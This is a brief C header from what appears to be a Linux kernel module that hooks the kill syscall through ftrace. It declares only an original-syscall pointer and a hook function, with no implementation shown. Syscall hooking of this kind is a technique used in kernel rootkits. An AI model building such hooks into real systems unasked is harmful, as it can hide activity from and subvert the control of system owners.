// TODO dont forget PTREGS macro
#ifndef KILL_HOOK_H
#define KILL_HOOK_H

#include <linux/ptrace.h> 
#include <linux/sched.h>   
#include <linux/printk.h>

#include "utils/ftrace_utils.h"

// Original syscall pointer 
extern asmlinkage long (*orig_kill)(const struct pt_regs *);

// Hook function for kill
extern asmlinkage int hook_kill(const struct pt_regs *regs);

#endif // KILL_HOOK_H

